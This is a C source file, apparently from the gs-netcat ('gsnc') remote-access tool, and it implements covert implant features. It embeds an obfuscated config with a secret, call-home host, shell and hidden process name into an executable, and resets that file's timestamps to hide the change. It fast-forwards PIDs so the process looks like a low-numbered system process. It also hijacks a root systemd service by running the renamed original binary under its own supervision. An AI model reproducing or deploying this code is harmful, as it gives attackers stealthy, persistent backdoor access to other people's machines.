#include "common.h"
#include "utils.h"
#include "gsnc-utils.h"

static char *systemd_argv_match;

// ENV VARIABLES:
// ==============
// CONFIG_WRITE=-           - Write to STDOUT
// CONFIG_WRITE="file.dat"  - Append or overwrite config at the end of file.dat
//
// CONFIG_READ="0"          - Do not read the config at all.
// CONFIG_READ=             - Not set or empty: Read from current executable.
// CONFIG_READ="file.dat"   - Read config from 'file.dat'.
//
// CONFIG_CHECK             - Exit(0) if config exists and is valid.

// read config.
// Position at end of file (or overwrite existing, if magic found at end of file)
// Return 0 if config was read.
static int
config_read(struct gsnc_config *c, FILE *fp) {
    char buf[64];
    int i;
    int ret;

    if (fp == NULL)
        return 202;

    fseek(fp, 0 - sizeof *c, SEEK_END);
    ret = fread(c, sizeof *c, 1, fp);
    
    if (ret != 1)
        return 200;

     // Check magic
    snprintf(buf, sizeof buf, "%s", GSNC_CONFIG_MAGIC_STR);
    for (i = 0; i < sizeof c->magic; i++) {
        if (c->magic[i] != (buf[i] ^ GSNC_CONFIG_MAGIC_XOR))
            return 201;
    }

    fseek(fp, 0 - sizeof *c, SEEK_END);
    return 0;
}

// Store start-up options in a file.
// fn == "-" -> STDOUT
int
GSNC_config_write(const char *fn) {
    FILE *fp = NULL;
    struct gsnc_config c;
    int i;
    char buf[1024];
    int ret = 200;
    char *ptr;
    struct stat sb;
    int is_fix_ts = 0;

    if (fn == NULL) {
        return 254;
    }

	if (gopt.sec_str == NULL) {
		gopt.sec_str = GS_GETENV2("SECRET");
    }

    if (gopt.sec_str == NULL) {
        fprintf(stderr, "-s or GS_SECRET not specified\n");
        return 253;
    }

    if ((fn[0] == '-') && (fn[1] == '\0'))
        fp = stdout;

    if (fp == NULL) {
        fp = fopen(fn, "r+");
        if (fp == NULL) {
            fprintf(stderr, "ERROR: %s: %s\n", fn, strerror(errno));
            goto err;
        }

        if (fstat(fileno(fp), &sb) == 0)
            is_fix_ts = 1;
        config_read(&c, fp);
    }

    memset(&c, 0, sizeof c);
    snprintf(buf, sizeof buf, "%s", GSNC_CONFIG_MAGIC_STR);
    for (i = 0; i < sizeof c.magic; i++) {
        c.magic[i] = buf[i] ^ GSNC_CONFIG_MAGIC_XOR;
    }

    snprintf(c.sec_str, sizeof c.sec_str, "%s", gopt.sec_str);

    if ((ptr = GS_GETENV2("PROC_HIDDENNAME")) != NULL)
        snprintf(c.proc_hiddenname, sizeof c.proc_hiddenname, "%s", ptr);

    if ((ptr = GS_GETENV2("HOST")) != NULL)
        snprintf(c.host, sizeof c.host, "%s", ptr);

    if ((ptr = GS_GETENV2("PORT")) != NULL)
        c.port = atoi(ptr);

    if ((ptr = GS_getenv("SHELL")) != NULL)
        snprintf(c.shell, sizeof c.shell, "%s", ptr);

    if ((ptr = GS_GETENV2("DOMAIN")) != NULL)
        snprintf(c.domain, sizeof c.domain, "%s", ptr);

    if ((ptr = GS_GETENV2("WORKDIR")) != NULL)
        snprintf(c.workdir, sizeof c.workdir, "%s", ptr);
    
    if ((ptr = GS_GETENV2("SYSTEMD_ARGV_MATCH")) != NULL)
        snprintf(c.systemd_argv_match, sizeof c.systemd_argv_match, "%s", ptr);

    c.callhome_sec = gopt.callhome_sec;
    c.flags |= (gopt.flags & GSC_FL_OPT_TOR);
    c.flags |= (gopt.flags & GSC_FL_OPT_DAEMON);
    c.flags |= (gopt.flags & GSC_FL_OPT_WATCHDOG);
    c.flags |= (gopt.flags & GSC_FL_OPT_QUIET);

    if (GS_GETENV2("FFPID"))
        c.flags |= GSC_FL_FFPID;
    if (GS_GETENV2("CCG"))
        c.flags |= GSC_FL_CHANGE_CGROUP;
    if (GS_GETENV2("DELME"))
        c.flags |= GSC_FL_DELME;
    if (GS_GETENV2("CPEXECME"))
        c.flags |= GSC_FL_CPEXECME;

    if (fwrite(&c, sizeof c, 1, fp) != 1)
        goto err;
    fp = freopen(NULL, "r", fp); // Must reopen so set timestamp NOW and adjust below:

    if ((fp != NULL) && (is_fix_ts != 0)) {
        // FIX timestamp:
        struct timespec ts[2];
#ifdef __APPLE__
        memcpy(&ts[0], &sb.st_atimespec, sizeof ts[0]);
        memcpy(&ts[1], &sb.st_mtimespec, sizeof ts[1]);
#else
        memcpy(&ts[0], &sb.st_atim, sizeof ts[0]);
        memcpy(&ts[1], &sb.st_mtim, sizeof ts[1]);
#endif    
        // futimens(fileno(fp), &sb.st_atimespec);  # OSX
        futimens(fileno(fp), ts);
    }

    ret = 0;
err:
    XFCLOSE(fp);
    return ret;
}

// Return 0 if config could be read EOF of fn
int
GSNC_config_read(const char *fn) {
    FILE *fp;
    struct gsnc_config c;
    int ret = -1;

    if (!(gopt.flags & GSC_FL_WANT_CONFIG_READ))
        return -1;

    fn = GS_GETENV2("CONFIG_READ")?:fn;

    if (fn == NULL)
        return -1;
    errno = 0;
    fp = fopen(fn, "rb");
    DEBUGF("fn=%s fp=%p, %s\n", fn, fp, strerror(errno));

    if (fp == NULL)
        return -1;

    if (config_read(&c, fp) != 0)
        goto err;

    gopt.sec_str = strdup(c.sec_str);
    if (c.host[0] != '\0')
        gopt.gs_host = strdup(c.host);
    if (c.shell[0] != '\0')
        gopt.gs_shell = strdup(c.shell);
    if (c.domain[0] != '\0')
        gopt.gs_domain = strdup(c.domain);
    if (c.workdir[0] != '\0')
        gopt.gs_workdir = strdup(c.workdir);
    if (c.proc_hiddenname[0] != '\0')
        gopt.proc_hiddenname = strdup(c.proc_hiddenname);
    if (c.systemd_argv_match[0] != '\0')
        systemd_argv_match = strdup(c.systemd_argv_match);

    gopt.gs_port = c.port;
    gopt.callhome_sec = c.callhome_sec;

    gopt.flags |= (c.flags & GSC_FL_OPT_TOR);
    gopt.flags |= (c.flags & GSC_FL_OPT_DAEMON);
    gopt.flags |= (c.flags & GSC_FL_OPT_WATCHDOG);
    gopt.flags |= (c.flags & GSC_FL_OPT_QUIET);
    gopt.flags |= (c.flags & GSC_FL_FFPID);
    gopt.flags |= (c.flags & GSC_FL_CHANGE_CGROUP);
    gopt.flags |= (c.flags & GSC_FL_DELME);
    gopt.flags |= (c.flags & GSC_FL_CPEXECME);

    // Implied:
    gopt.is_interactive = 1;
    gopt.flags |= GSC_FL_IS_SERVER;
    gopt.flags |= GSC_FL_IS_STEALTH;

    gopt.flags |= GSC_FL_CONFIG_READ_OK;
    ret = 0;
err:
    XFCLOSE(fp);
    return ret;
}


#if defined(HAVE_SCHED_H) && defined(__linux__)
# define WITH_FFPID  (1)
#endif

#ifndef WITH_FFPID
static void forward_pid_worker(int worker) { return; }
#else
static void
forward_pid_worker(int worker) {

    pid_t p = getpid();
    pid_t old_p;
    char stack[1024]; // pid fast forwarding stack.

    signal(SIGCHLD, SIG_IGN);
    while (1) {
        old_p = p;
        p = clone((int (*)(void *))exit, stack + sizeof stack, CLONE_VFORK | CLONE_VM | SIGCHLD, NULL);
        if (p <= 0)
            break;
        if (p < old_p) {
            break;
        }
    }
    exit(0);
}
#endif

#define FF_PID_MAX_WORKERS        (8)
pid_t workers[FF_PID_MAX_WORKERS];

static int ffpid_ok;

static void
cb_alarm(int sig) {
    int i = 0;

    while (workers[i] != 0) {
        kill(workers[i++], SIGTERM);
    }
    alarm(0);
    ffpid_ok = -1;
}

// Fast-Forward to a small pid (<1000). Return found pid.
pid_t
forward_pid() {
    int i;
    pid_t pid_rv = getpid();

#ifndef WITH_FFPID
    return pid_rv;
#endif
    if (pid_rv < 1000)
        return pid_rv;

    signal(SIGCHLD, SIG_DFL); // needed for waitpid() below
    signal(SIGALRM, cb_alarm);
    alarm(40);

    // Start 8 workers that call clone()
    for (i = 0; i < FF_PID_MAX_WORKERS; i++) {
        workers[i] = fork();
        if (workers[i] < 0)
            break;
        if (workers[i] == 0) {
            forward_pid_worker(i);
            exit(0); // CHILD exit
        }
    }

    while (i > 0) {
        waitpid(-1, NULL, 0);
        i--;
    }
    // Find out next pid.
    pid_rv = fork();
    if (pid_rv == 0)
        exit(0);

    alarm(0);
    signal(SIGALRM, SIG_DFL);
    return pid_rv;
}

// Find lowest pid and exit.
void
do_util_ffpid(void) {
    pid_t pid;
    if (GS_GETENV2("UTIL_FFPID") == NULL)
        return;
    pid = forward_pid();

    printf("%d\n", pid);
    exit(ffpid_ok);
}

static pid_t sv_pid;

static void
cb_sigforward(int sig) {
    if (sv_pid <= 0)
        return;

    if (sig == SIGCHLD) {
        // This can not happen (we are no longer parent of child's child)
        kill(sv_pid, SIGTERM);
        exit(255);
    }

    if (kill(sv_pid, sig) != 0)
        exit(EX_SIGTERM);

    if (sig == SIGTERM)
        exit(EX_SIGTERM);
}

void
sv_sigforward(int sig) {
    if (sv_pid <= 0)
        return;

    if (kill(sv_pid, sig) != 0)
        sv_pid = 0;
}

static void
sv_startorig(char *argv[]) {
    char buf[1024];

    snprintf(buf, sizeof buf, "%s ", argv[0]);  // Original binary is saved as "name\w" name+(space)
    execv(buf, argv);

    exit(0); // ERROR but exit with 0.
}

// Do nothing unless started by systemd.
// Supervise the original binary.
// The original is spawned as a daemonized child (PPID=1) of gsnc.
// The alternative would be to start gsnc as a child of the original process
// the concerns are:
// - GSNC would start again if the service restarts. (is this true? doesn't it kill in cgroup anyway?)
// - GSNC would constantly need to check if (original) parent has
//   restarted
// - GSNC would not be restarted if it died.
void
init_supervise(int *argc, char *argv[]) {
    char buf[1024];
	struct stat sb;
    pid_t pid;
    int is_systemd = 0;
    int is_tty;
    int i;

    if (!(gopt.flags & GSC_FL_WANT_CONFIG_READ))
        return; // GS_CONFIG_READ=0, means gs-user wants to execute us (not the service).
    
    if (!(gopt.flags & GSC_FL_CONFIG_READ_OK))
        return; // no valid config found.

    if (gopt.flags & GSC_FL_CONFIG_CHECK)
        return; // output config and exit.

    snprintf(buf, sizeof buf, "%s ", argv[0]);  // Original binary is saved as "name\w" name+(space)
    if (stat(buf, &sb) != 0)
        return; // original binary does not exists. Continue with GSNC.

    if (systemd_argv_match != NULL) {
        // agetty: Check if this is the service for TTY1, otherwise start _just_ agetty@argv
        char *ptr = NULL;
        for (i = 1; i < *argc && ptr == NULL; i++) {
            ptr = strstr(argv[i], systemd_argv_match);
        }
        if (ptr == NULL)
            goto execorig;
        XFREE(systemd_argv_match);
    }

    pid_t ppid = getppid();
    if (ppid > 1)
        goto execorig; // NOT started from systemd.
    if (getuid() != 0)
        goto execorig; // We only use root-services to start gsnc from systemd.

    if (getenv("SYSTEMD_EXEC_PID") != NULL)
        is_systemd++; // Older systemd's dont set this.
    else if (getenv("INVOCATION_ID") != NULL)
        is_systemd++; // Older systemd's dont set this.

    // FIXME: Some systems dont set EXEC_PID or INVOCATION_ID.
    // Assume that if we are a daemon (ppid=1) and the '%s ' exists that
    // we were started from systemd.    
    if ((is_systemd == 0) && (ppid <= 1))
        is_systemd++;

    if (is_systemd == 0)
        goto execorig; // not started from systemd

    int fds[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, fds);

    // Double-fork() so that child's child has PPID==1
    signal(SIGHUP, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);

    // Systemd may have made us the controlling terminal. Give it up
    // and let our grand-child become the controlling terminal.
    if ((is_tty = isatty(0)))
        ioctl(0, TIOCNOTTY, NULL);

    if ((pid = fork()) < 0)
        goto execorig; // ERROR

    if (pid > 0) {
        // Grand-PARENT
        close(fds[1]);
        pid = 0;

        // Read the PID of the service; needed for cb_sigforward
        read(fds[0], &sv_pid, sizeof sv_pid);
        close(fds[0]);
        // The command line options are valid for the CHILD only.
        // Parent (gsnc) shall ignore them and never use them.
        *argc = 1;
        argv[1] = NULL;

        // Proxy most signals to the real daemon
        signal(SIGHUP, cb_sigforward);
        signal(SIGINT, cb_sigforward);
        signal(SIGQUIT, cb_sigforward);
        signal(SIGUSR1, cb_sigforward);
        signal(SIGUSR2, cb_sigforward);
        signal(SIGPIPE, cb_sigforward);
        signal(SIGTERM, cb_sigforward);
        signal(SIGURG, cb_sigforward);
        signal(SIGWINCH, cb_sigforward);
        return; // gsnc to continue
    }

    // CHILD
    close(fds[0]);
    if ((pid = fork()) < 0)
        return;
    if (pid > 0) {
        // PARENT (child of Grand-PARENT)
        write(fds[1], &pid, sizeof pid);
        read(fds[1], &pid, sizeof pid); // Return when grand-parent has read pv_pid.
        exit(0);	// child's parent exits.
    }

    // HERE: Grand-CHILD. (now with PPID==1)
    close(fds[1]);

    if (is_tty)
        tty_leader(0);
    signal(SIGHUP, SIG_DFL);
    signal(SIGCHLD, SIG_DFL);

execorig:
    sv_startorig(argv);
}

